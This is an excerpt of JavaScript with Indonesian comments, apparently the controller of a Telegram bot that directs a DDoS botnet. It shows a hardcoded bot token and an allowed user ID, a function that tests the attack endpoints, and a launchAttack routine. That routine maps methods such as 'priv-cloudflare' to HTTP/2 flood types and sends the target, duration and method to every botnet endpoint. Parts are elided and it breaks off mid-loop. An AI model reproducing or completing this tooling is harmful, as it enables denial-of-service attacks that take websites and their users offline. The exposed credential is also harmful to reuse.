...
const token = '8523473289:AAHY-HzYcbbULBH0wKOZqNfvl9AtAHO9srw'; // GANTI DENGAN TOKEN BOTFATHER
const allowedId = 8084582143; // GANTI DENGAN ID TELEGRAM ANDA
...
async function testEndpoint(endpoint) {
  try {
    const response = await fetch(`${endpoint}?target=test.com&time=1&methods=H2-DOLBY`, { 
      timeout: 10000 
    });
...
// Launch attack ke semua endpoints
async function launchAttack(target, time, method) {
  ...
  const methodMapping = {
    'priv-vgor': 'H2-DOLBY',
    'priv-cloudflare': 'H2-BIPAS'
  };

  const serverMethod = methodMapping[method];
  if (!serverMethod) {
    return { success: false, message: '❌ Method tidak valid' };
  }

  const cleanTarget = target.replace(/^https?:\/\//, '');

  // Kirim attack ke semua endpoints
  for (const endpoint of botnetData.endpoints) {
    try {
      const attackUrl = `${endpoint}?target=${cleanTarget}&time=${time}&methods=${serverMethod}`;
